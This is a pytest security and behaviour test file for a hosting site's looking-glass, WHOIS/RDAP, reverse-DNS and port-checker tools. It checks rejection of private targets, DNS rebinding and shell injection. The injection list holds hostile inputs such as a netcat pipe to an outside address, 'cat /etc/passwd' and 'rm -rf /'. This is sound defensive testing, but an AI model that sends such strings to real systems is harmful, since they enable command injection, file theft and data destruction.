"""Looking glass, WHOIS/RDAP, reverse DNS and port checker: security and behaviour tests (offline)."""
import asyncio
import socket

import pytest
from httpx import ASGITransport, AsyncClient

from app.api import lookingglass, portcheck, rdns, whois
from app.core import ratelimit
from app.core.config import TOOLS
from app.core.httpjson import FetchError
from app.core.target import TargetError, parse_target
from app.main import app

API = "/tools/api/v1"
REAL = {"X-Real-IP": "198.51.100.77"}  # test-net address only used as an opaque rate-limit key
PUBLIC_VISITOR = {"X-Real-IP": "93.184.215.14"}

PRIVATE_TARGETS = [
    "127.0.0.1", "10.0.0.1", "172.16.5.5", "192.168.1.1", "169.254.169.254", "100.64.0.1", "224.0.0.1",
    "0.0.0.0", "240.0.0.1", "255.255.255.255", "::1", "fe80::1", "fd00::1", "ff02::1", "::ffff:127.0.0.1",
    "::ffff:10.0.0.1", "160.22.109.1", "160.22.109.2", "160.22.109.9", "fe80::1%eth0", "localhost",
    "foo.localhost", "printer.local", "intranet", "metadata.internal",
]
INJECTION = [
    "8.8.8.8; id", "8.8.8.8 && cat /etc/passwd", "$(id).example.com", "`id`.example.com", "8.8.8.8|nc 1.2.3.4 1",
    "-c 1 8.8.8.8", "--help", "-f 8.8.8.8", "example.com\nid", "example.com\r\nX: y", "8.8.8.8 -s 65000",
    "a b.example.com", "example.com;ls", "'; rm -rf /; '", "../../etc/passwd", "8.8.8.8\x00id",
]


@pytest.fixture
async def client():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        yield c


@pytest.fixture(autouse=True)
def fresh_state(monkeypatch):
    monkeypatch.setattr(ratelimit, "_bucket", ratelimit.TokenBucket(1000))
    for mod in (lookingglass, portcheck):
        monkeypatch.setattr(mod, "_bucket", ratelimit.TokenBucket(1000))
    for mod in (whois, rdns):
        monkeypatch.setattr(mod, "_bucket", ratelimit.TokenBucket(1000))
    monkeypatch.setattr(whois, "_cache", whois.TTLCache(300))
    monkeypatch.setattr(rdns, "_cache", rdns.TTLCache(120))
    monkeypatch.setattr(lookingglass, "_bgp_cache", lookingglass.TTLCache(300))

    async def no_enrich(hops, loss_pct=None):
        return None
    monkeypatch.setattr(lookingglass, "_enrich", no_enrich)  # keep the old lg tests offline


@pytest.fixture
def no_exec(monkeypatch):
    """Any attempt to run a process fails the test; used for rejected targets."""
    async def boom(*a, **kw):
        raise AssertionError(f"process execution attempted: {a}")
    monkeypatch.setattr(asyncio, "create_subprocess_exec", boom)
    monkeypatch.setattr(asyncio, "create_subprocess_shell", boom)


def fake_dns(monkeypatch, table):
    real = socket.getaddrinfo

    def gai(host, port, *a, **kw):
        if host in table:
            return [(socket.AF_INET6 if ":" in ip else socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port or 0))
                    for ip in table[host]]
        return real(host, port, *a, **kw)
    monkeypatch.setattr(socket, "getaddrinfo", gai)


# ---------------------------------------------------------------- target validation
@pytest.mark.parametrize("t", PRIVATE_TARGETS)
def test_parse_target_rejects_private(t):
    with pytest.raises(TargetError):
        parse_target(t)


@pytest.mark.parametrize("t", INJECTION)
def test_parse_target_rejects_injection(t):
    with pytest.raises(TargetError):
        parse_target(t)


@pytest.mark.parametrize("t,expect", [("8.8.8.8", True), ("2606:4700:4700::1111", True), ("Example.COM", False),
                                      ("bücher.example", False)])
def test_parse_target_accepts_public(t, expect):
    value, is_ip = parse_target(t)
    assert is_ip is expect and not value.startswith("-")


# ---------------------------------------------------------------- looking glass
@pytest.mark.parametrize("target", PRIVATE_TARGETS)
@pytest.mark.parametrize("tool", ["ping", "traceroute"])
async def test_lg_rejects_private_targets(client, no_exec, target, tool):
    r = await client.post(f"{API}/lg/run", json={"target": target, "tool": tool}, headers=REAL)
    assert r.status_code == 422, (target, r.text)


@pytest.mark.parametrize("target", INJECTION)
async def test_lg_rejects_shell_injection(client, no_exec, target):
    r = await client.post(f"{API}/lg/run", json={"target": target, "tool": "ping"}, headers=REAL)
    assert r.status_code == 422, (target, r.text)
    r = await client.post(f"{API}/lg/bgp", json={"target": target}, headers=REAL)
    assert r.status_code == 422


async def test_lg_rejects_other_tool(client, no_exec):
    r = await client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "nmap"}, headers=REAL)
    assert r.status_code == 422


@pytest.mark.parametrize("answer", [["127.0.0.1"], ["10.0.0.5"], ["8.8.8.8", "169.254.169.254"], ["::1"], ["160.22.109.9"]])
async def test_lg_rejects_name_resolving_private(client, monkeypatch, no_exec, answer):
    fake_dns(monkeypatch, {"evil.example.net": answer})
    r = await client.post(f"{API}/lg/run", json={"target": "evil.example.net", "tool": "ping"}, headers=REAL)
    assert r.status_code == 422 and "non-public" in r.json()["detail"]


def test_build_argv_is_fixed_and_capped():
    assert lookingglass.build_argv("ping", "8.8.8.8") == ["ping", "-4", "-n", "-c", "4", "-i", "0.5", "-W", "2", "-w", "10", "8.8.8.8"]
    tr = lookingglass.build_argv("traceroute", "2606:4700:4700::1111")
    assert tr[:2] == ["traceroute", "-6"] and tr[tr.index("-m") + 1] == "30" and tr[-1] == "2606:4700:4700::1111"
    with pytest.raises(ValueError):
        lookingglass.build_argv("nmap", "8.8.8.8")


async def test_lg_runs_argv_list_never_a_shell(client, monkeypatch):
    seen = {}

    async def fake_run(argv, timeout):
        seen["argv"], seen["timeout"] = argv, timeout
        return 0, ("PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n4 packets transmitted, 4 received, 0% packet loss, time 1502ms\n"
                   "rtt min/avg/max/mdev = 1.100/1.200/1.300/0.050 ms\n"), False
    monkeypatch.setattr(lookingglass, "_run", fake_run)
    r = await client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers=REAL)
    assert r.status_code == 200, r.text
    d = r.json()
    assert isinstance(seen["argv"], list) and seen["argv"][-1] == "8.8.8.8" and seen["timeout"] <= 12
    assert d["source"]["asn"] == "AS152523" and "AS152523 Noida" in d["source"]["label"]
    assert d["summary"]["received"] == 4 and d["summary"]["rtt_ms"]["avg"] == 1.2 and d["reachable"] is True


async def test_lg_traceroute_parse_and_hostname_pinned(client, monkeypatch):
    fake_dns(monkeypatch, {"ok.example.net": ["93.184.215.14"]})
    seen = {}

    async def fake_run(argv, timeout):
        seen["argv"] = argv
        return 0, "traceroute to 93.184.215.14, 30 hops max\n 1  10.1.1.1  0.5 ms\n 2  *\n 3  93.184.215.14  9.9 ms\n", False
    monkeypatch.setattr(lookingglass, "_run", fake_run)
    r = await client.post(f"{API}/lg/run", json={"target": "ok.example.net", "tool": "traceroute"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and seen["argv"][-1] == "93.184.215.14"  # the resolved IP, never the name
    assert [h["hop"] for h in d["hops"]] == [1, 2, 3] and d["hops"][1]["ip"] is None and d["reached"] is True
    assert d["max_hops"] == 30


def test_redact_internal_hops_but_keep_public():
    lines = ["1  10.10.77.85  0.5 ms", "2  169.254.32.1  1 ms", "3  160.22.109.1  1 ms", "4  172.16.16.8  2 ms",
             "5  fe80::1  1 ms", "6  93.184.215.14  9 ms", "7  2606:4700:4700::1111  9 ms"]
    out = lookingglass.redact_internal("\n".join(" " + ln for ln in lines) + "\n")
    for secret in ("10.10.77.85", "169.254.32.1", "160.22.109.1", "172.16.16.8", "fe80::1"):
        assert secret not in out
    assert out.count("[private]") == 5 and "93.184.215.14" in out and "2606:4700:4700::1111" in out
    hops = lookingglass.parse_traceroute(out)
    assert hops[0]["ip"] == "private" and hops[5]["ip"] == "93.184.215.14"


async def test_run_executes_without_shell(monkeypatch):
    """_run uses create_subprocess_exec with the argv list and a minimal environment."""
    calls = {}

    class P:
        returncode = 0
        stdout = None

        async def wait(self):
            return 0
    class R:
        async def read(self, n):
            return b""
    P.stdout = R()

    async def fake_exec(*args, **kw):
        calls["args"], calls["kw"] = args, kw
        return P()
    monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_exec)
    monkeypatch.setattr(lookingglass.shutil, "which", lambda n: "/usr/bin/" + n)
    await lookingglass._run(["ping", "-4", "8.8.8.8; id"], 5)
    assert calls["args"][0] == "/usr/bin/ping" and calls["args"][-1] == "8.8.8.8; id"  # data stays one argv item
    assert "shell" not in calls["kw"] and set(calls["kw"]["env"]) == {"LC_ALL", "PATH"}


async def test_run_timeout_kills_process():
    import sys
    # real process: python sleeping 30 s must be killed at the 0.5 s cap
    orig = lookingglass.shutil.which
    lookingglass.shutil.which = lambda n: sys.executable
    try:
        rc, text, timed_out = await lookingglass._run(["python", "-c", "import time; time.sleep(30)"], 0.5)
    finally:
        lookingglass.shutil.which = orig
    assert timed_out is True and rc is not None


async def test_lg_rate_limit_triggers(client, monkeypatch):
    monkeypatch.setattr(lookingglass, "_bucket", ratelimit.TokenBucket(6, 3))

    async def fake_run(argv, timeout):
        return 0, "4 packets transmitted, 4 received, 0% packet loss\n", False
    monkeypatch.setattr(lookingglass, "_run", fake_run)
    codes = [(await client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers=REAL)).status_code
             for _ in range(6)]
    assert codes[:3] == [200, 200, 200] and 429 in codes
    other = await client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers={"X-Real-IP": "198.51.100.78"})
    assert other.status_code == 200  # limit is per client IP


async def test_lg_one_run_per_ip_and_global_gate(client, monkeypatch):
    release = asyncio.Event()

    async def slow_run(argv, timeout):
        await release.wait()
        return 0, "", False
    monkeypatch.setattr(lookingglass, "_run", slow_run)
    first = asyncio.create_task(client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers=REAL))
    await asyncio.sleep(0.1)
    second = await client.post(f"{API}/lg/run", json={"target": "1.1.1.1", "tool": "ping"}, headers=REAL)
    assert second.status_code == 429 and "already have a check running" in second.json()["detail"]
    release.set()
    assert (await first).status_code == 200


async def test_lg_global_concurrency_gate_503(client, monkeypatch):
    monkeypatch.setattr(lookingglass, "_gate", lookingglass.Gate(1, "Looking glass"))
    monkeypatch.setattr("app.core.ratelimit.QUEUE_WAIT", 0.1)
    release = asyncio.Event()

    async def slow_run(argv, timeout):
        await release.wait()
        return 0, "", False
    monkeypatch.setattr(lookingglass, "_run", slow_run)
    a = asyncio.create_task(client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers={"X-Real-IP": "198.51.100.1"}))
    await asyncio.sleep(0.1)
    b = await client.post(f"{API}/lg/run", json={"target": "8.8.8.8", "tool": "ping"}, headers={"X-Real-IP": "198.51.100.2"})
    assert b.status_code == 503
    release.set()
    await a


async def test_bgp_uses_ripestat_only(client, monkeypatch):
    urls = []

    async def fake_fetch(url, params=None, timeout=8.0, headers=None):
        urls.append((url, params))
        if "prefix-overview" in url:
            return {"data": {"resource": "8.8.8.0/24", "announced": True, "asns": [{"asn": 15169, "holder": "GOOGLE"}]}}
        return {"data": {"rrcs": [{"rrc": "RRC00", "location": "Amsterdam", "peers": [
            {"as_path": "3333 15169", "prefix": "8.8.8.0/24"}, {"as_path": "1 152523 15169", "prefix": "8.8.8.0/24"}]}]}}
    monkeypatch.setattr(lookingglass, "fetch_json", fake_fetch)
    r = await client.post(f"{API}/lg/bgp", json={"target": "8.8.8.8"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and d["prefix"] == "8.8.8.0/24" and d["origin_asns"][0]["asn"] == "AS15169"
    assert d["via_as152523"] is True and d["paths"][0]["as_path"] == "3333 15169"
    assert all(u.startswith("https://stat.ripe.net/data/") for u, _ in urls)
    await client.post(f"{API}/lg/bgp", json={"target": "8.8.8.8"}, headers=REAL)
    assert len(urls) == 2  # second call served from cache


async def test_bgp_upstream_failure_is_502(client, monkeypatch):
    async def fail(*a, **kw):
        raise FetchError("boom")
    monkeypatch.setattr(lookingglass, "fetch_json", fail)
    r = await client.post(f"{API}/lg/bgp", json={"target": "8.8.8.8"}, headers=REAL)
    assert r.status_code == 502


# ---------------------------------------------------------------- whois / rdap
@pytest.mark.parametrize("q", PRIVATE_TARGETS + INJECTION)
async def test_whois_rejects_bad_queries(client, q):
    r = await client.post(f"{API}/whois/lookup", json={"query": q}, headers=REAL)
    assert r.status_code == 422, (q, r.text)


DNS_BOOT = [[["com", "net"], ["https://rdap.verisign.example/com/v1/"]], [["in"], ["https://rdap.in.example/"]]]
IPV4_BOOT = [[["8.0.0.0/8"], ["https://rdap.arin.example/registry/"]], [["8.8.8.0/24"], ["https://rdap.more.example/"]]]


async def test_rdap_domain_walks_to_registered_parent(client, monkeypatch):
    calls = []

    async def fake_fetch(url, params=None, timeout=8.0, headers=None):
        calls.append(url)
        if url.endswith("/dns.json"):
            return {"services": DNS_BOOT}
        if url.endswith("/domain/www.example.com"):
            raise FetchError("not found", 404)
        if url.endswith("/domain/example.com"):
            return {"ldhName": "EXAMPLE.COM", "status": ["client transfer prohibited"],
                    "events": [{"eventAction": "registration", "eventDate": "1995-08-14T04:00:00Z"},
                               {"eventAction": "expiration", "eventDate": "2030-08-13T04:00:00Z"}],
                    "nameservers": [{"ldhName": "A.IANA-SERVERS.NET"}],
                    "secureDNS": {"delegationSigned": True},
                    "entities": [{"roles": ["registrar"], "handle": "376", "vcardArray": ["vcard", [["fn", {}, "text", "Reg Inc"]]],
                                  "publicIds": [{"type": "IANA Registrar ID", "identifier": "376"}]},
                                 {"roles": ["registrant"], "vcardArray": ["vcard", [["fn", {}, "text", "Jane Private"],
                                                                                   ["email", {}, "text", "jane@example.org"]]]}]}
        raise AssertionError(url)
    monkeypatch.setattr(whois, "fetch_json", fake_fetch)
    r = await client.post(f"{API}/whois/lookup", json={"query": "WWW.Example.com"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200, r.text
    assert d["registered_domain"] == "example.com" and d["protocol"] == "rdap" and d["dnssec"] is True
    assert d["events"]["expiration"].startswith("2030") and d["nameservers"] == ["a.iana-servers.net"]
    assert "Jane" not in r.text and "jane@" not in r.text  # registrant personal data is never returned
    reg = [e for e in d["entities"] if "registrar" in e["roles"]][0]
    assert reg["name"] == "Reg Inc" and reg["iana_id"] == "376"
    n = len(calls)
    await client.post(f"{API}/whois/lookup", json={"query": "www.example.com"}, headers=REAL)
    assert len(calls) == n  # cached


async def test_rdap_ip_longest_prefix_bootstrap(client, monkeypatch):
    urls = []

    async def fake_fetch(url, params=None, timeout=8.0, headers=None):
        urls.append(url)
        if url.endswith("/ipv4.json"):
            return {"services": IPV4_BOOT}
        return {"name": "GOGL", "handle": "NET-8-8-8-0-2", "startAddress": "8.8.8.0", "endAddress": "8.8.8.255",
                "ipVersion": "v4", "country": "US", "cidr0_cidrs": [{"v4prefix": "8.8.8.0", "length": 24}], "entities": []}
    monkeypatch.setattr(whois, "fetch_json", fake_fetch)
    r = await client.post(f"{API}/whois/lookup", json={"query": "8.8.8.8"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and d["cidr"] == ["8.8.8.0/24"] and d["source"] == "https://rdap.more.example/"
    assert urls[-1] == "https://rdap.more.example/ip/8.8.8.8"


async def test_whois_port43_only_when_tld_has_no_rdap(client, monkeypatch):
    async def fake_fetch(url, params=None, timeout=8.0, headers=None):
        return {"services": DNS_BOOT}
    monkeypatch.setattr(whois, "fetch_json", fake_fetch)
    asked = []

    async def fake43(host, query):
        asked.append((host, query))
        return "whois:        whois.nic.zz\n" if host == "whois.iana.org" else "Domain Name: EXAMPLE.ZZ\r\x07\n"
    monkeypatch.setattr(whois, "_whois43", fake43)
    r = await client.post(f"{API}/whois/lookup", json={"query": "example.zz"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and d["protocol"] == "whois" and asked == [("whois.iana.org", "zz"), ("whois.nic.zz", "example.zz")]
    assert "\x07" not in d["raw"]
    asked.clear()
    r = await client.post(f"{API}/whois/lookup", json={"query": "example.in"}, headers=REAL)  # has RDAP: never port 43
    assert not asked


async def test_fetch_json_guard_refuses_internal_and_http():
    from app.core import httpjson
    for url in ["http://rdap.example.com/x", "https://127.0.0.1/x", "https://10.0.0.1/", "https://localhost/",
                "https://169.254.169.254/latest/", "https://user:pw@rdap.example.com/"]:
        with pytest.raises(FetchError):
            await httpjson.fetch_json(url)


async def test_fetch_json_refuses_name_resolving_internal(monkeypatch):
    from app.core import httpjson
    fake_dns(monkeypatch, {"rebind.example.net": ["127.0.0.1"]})
    with pytest.raises(FetchError):
        await httpjson.fetch_json("https://rebind.example.net/x")


# ---------------------------------------------------------------- reverse dns
@pytest.mark.parametrize("q", PRIVATE_TARGETS + INJECTION)
async def test_rdns_rejects_private_and_injection(client, q):
    r = await client.post(f"{API}/rdns/lookup", json={"ip": q}, headers=REAL)
    assert r.status_code == 422, (q, r.text)


async def test_rdns_hostname_input_refused(client):
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "example.com"}, headers=REAL)
    assert r.status_code == 422


async def test_rdns_fcrdns_pass_fail_and_mail_note(client, monkeypatch):
    async def fake_ptr(ip):
        return ["mail.example.net", "203-0-113-9.isp.example"], "ok"

    async def fake_fwd(name, v6):
        return {"mail.example.net": ["93.184.215.14"], "203-0-113-9.isp.example": ["198.51.100.1"]}[name]
    monkeypatch.setattr(rdns, "_ptr", fake_ptr)
    monkeypatch.setattr(rdns, "_forward", fake_fwd)
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "93.184.215.14"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and d["fcrdns"] is True and d["reverse_name"] == "14.215.184.93.in-addr.arpa"
    by = {p["hostname"]: p for p in d["ptr"]}
    assert by["mail.example.net"]["forward_confirmed"] is True and by["203-0-113-9.isp.example"]["forward_confirmed"] is False
    assert "mail" in d["mail_note"].lower()


async def test_rdns_no_ptr(client, monkeypatch):
    async def fake_ptr(ip):
        return [], "no_ptr"
    monkeypatch.setattr(rdns, "_ptr", fake_ptr)
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "2606:4700:4700::1111"}, headers=REAL)
    d = r.json()
    assert r.status_code == 200 and d["fcrdns"] is False and d["ptr"] == [] and "No PTR" in d["summary"]
    assert d["reverse_name"].endswith(".ip6.arpa")


def test_generic_ptr_heuristic():
    assert rdns.looks_generic("93-184-215-14.isp.example", "93.184.215.14")
    assert rdns.looks_generic("14.215.184.93.static.isp.example", "93.184.215.14")
    assert not rdns.looks_generic("mail.example.net", "93.184.215.14")


async def test_rdns_guide_link_only_when_flag_set(client, monkeypatch):
    async def fake_ptr(ip):
        return [], "no_ptr"
    monkeypatch.setattr(rdns, "_ptr", fake_ptr)
    page = await client.get("/tools/reverse-dns-lookup")
    assert "/blog/rdns-ptr-record-vps" not in page.text
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "8.8.8.8"}, headers=REAL)
    assert r.json()["guide_url"] is None
    import app.main as m
    monkeypatch.setattr(m, "RDNS_GUIDE_PUBLISHED", True)
    monkeypatch.setattr(rdns, "RDNS_GUIDE_PUBLISHED", True)
    page = await client.get("/tools/reverse-dns-lookup")
    assert 'href="https://bookmyhost.com/blog/rdns-ptr-record-vps"' in page.text
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "1.1.1.1"}, headers=REAL)
    assert r.json()["guide_url"] == "https://bookmyhost.com/blog/rdns-ptr-record-vps"


# ---------------------------------------------------------------- port checker
@pytest.fixture
def record_connect(monkeypatch):
    seen = []

    async def fake_open(host, port, *a, **kw):
        seen.append((host, port))
        if port == 22:
            raise ConnectionRefusedError()
        if port == 25:
            await asyncio.sleep(10)  # filtered: no answer
        class W:
            def close(self): pass
            async def wait_closed(self): pass
        return None, W()
    monkeypatch.setattr(asyncio, "open_connection", fake_open)
    monkeypatch.setattr(portcheck, "PORT_TIMEOUT", 0.2)
    return seen


async def test_port_check_uses_only_visitor_ip_and_ignores_target(client, record_connect):
    body = {"port": 443, "target": "10.0.0.5", "host": "127.0.0.1", "ip": "8.8.8.8", "address": "1.1.1.1", "hostname": "evil.example"}
    r = await client.post(f"{API}/ports/check?target=10.0.0.9&host=127.0.0.1&ip=1.1.1.1", json=body, headers=PUBLIC_VISITOR)
    assert r.status_code == 200, r.text
    assert r.json()["ip"] == "93.184.215.14"
    assert record_connect == [("93.184.215.14", 443)]


async def test_port_check_ignores_forwarded_for_and_other_headers(client, record_connect):
    hdr = {**PUBLIC_VISITOR, "X-Forwarded-For": "10.0.0.7", "Forwarded": "for=10.0.0.8", "X-Target": "127.0.0.1",
           "CF-Connecting-IP": "10.0.0.9"}
    r = await client.post(f"{API}/ports/check", json={"port": 80}, headers=hdr)
    assert r.status_code == 200 and record_connect == [("93.184.215.14", 80)]


@pytest.mark.parametrize("ip", ["10.0.0.5", "127.0.0.1", "192.168.1.9", "169.254.169.254", "::1", "100.64.0.9", "160.22.109.2"])
async def test_port_check_refuses_non_public_visitor(client, record_connect, ip):
    r = await client.post(f"{API}/ports/check", json={"port": 22}, headers={"X-Real-IP": ip})
    assert r.status_code == 422 and not record_connect


@pytest.mark.parametrize("body", [{}, {"port": 0}, {"port": 65536}, {"port": -1}, {"port": "22; id"}, {"port": "abc"}])
async def test_port_check_bad_port(client, record_connect, body):
    r = await client.post(f"{API}/ports/check", json=body, headers=PUBLIC_VISITOR)
    assert r.status_code == 422 and not record_connect


async def test_port_states_and_common_set(client, record_connect):
    r = await client.post(f"{API}/ports/check", json={"common": True}, headers=PUBLIC_VISITOR)
    d = r.json()
    states = {x["port"]: x["state"] for x in d["results"]}
    assert r.status_code == 200 and len(states) == len(portcheck.COMMON_PORTS)
    assert states[22] == "closed" and states[25] == "filtered" and states[443] == "open"
    assert {h for h, _ in record_connect} == {"93.184.215.14"}


async def test_port_rate_limit_triggers(client, record_connect, monkeypatch):
    monkeypatch.setattr(portcheck, "_bucket", ratelimit.TokenBucket(8, 4))
    codes = [(await client.post(f"{API}/ports/check", json={"port": 443}, headers=PUBLIC_VISITOR)).status_code for _ in range(7)]
    assert codes[:4] == [200] * 4 and 429 in codes


async def test_myip_reports_visitor(client):
    r = await client.get(f"{API}/ports/myip?ip=1.2.3.4", headers=PUBLIC_VISITOR)
    assert r.json() == {"ip": "93.184.215.14", "public": True}


# ---------------------------------------------------------------- pages / seo / sitemap
NEW = ["looking-glass", "whois-lookup", "reverse-dns-lookup", "port-checker"]


@pytest.mark.parametrize("slug", NEW)
async def test_new_pages_meta(client, slug):
    path = f"/tools/{slug}"
    r = await client.get(path)
    assert r.status_code == 200
    assert "<h1" in r.text and "FAQPage" in r.text and "WebApplication" in r.text
    assert f'<link rel="canonical" href="https://bookmyhost.com{path}"' in r.text
    assert 'href="https://bookmyhost.com"' in r.text  # money-page link
    assert "noindex" not in r.text.lower() and "X-Robots-Tag" not in r.headers
    assert "script-src 'self' 'nonce-" in r.headers["content-security-policy"]
    assert f"/js/tools/{slug}.js" in r.text


async def test_sitemap_index_and_api_docs_include_new_tools(client):
    s = (await client.get("/tools/sitemap.xml")).text
    for slug in NEW:
        assert f"<loc>https://bookmyhost.com/tools/{slug}</loc>" in s
    assert s.count("<loc>") == len(TOOLS) + 1
    idx = (await client.get("/tools/")).text
    for slug in NEW:
        assert f'href="/tools/{slug}"' in idx
    spec = (await client.get(f"{API}/openapi.json")).json()
    for p in ("/lg/run", "/lg/bgp", "/whois/lookup", "/rdns/lookup", "/ports/check"):
        assert f"{API}{p}" in spec["paths"]
    # the port checker schema has no target-like field at all
    props = spec["components"]["schemas"]["PortRequest"]["properties"]
    assert set(props) == {"port", "common"}


async def test_api_headers_new_endpoints(client):
    r = await client.post(f"{API}/rdns/lookup", json={"ip": "10.0.0.1"}, headers=REAL)
    assert r.headers["cache-control"] == "no-store" and r.headers["x-robots-tag"] == "noindex"
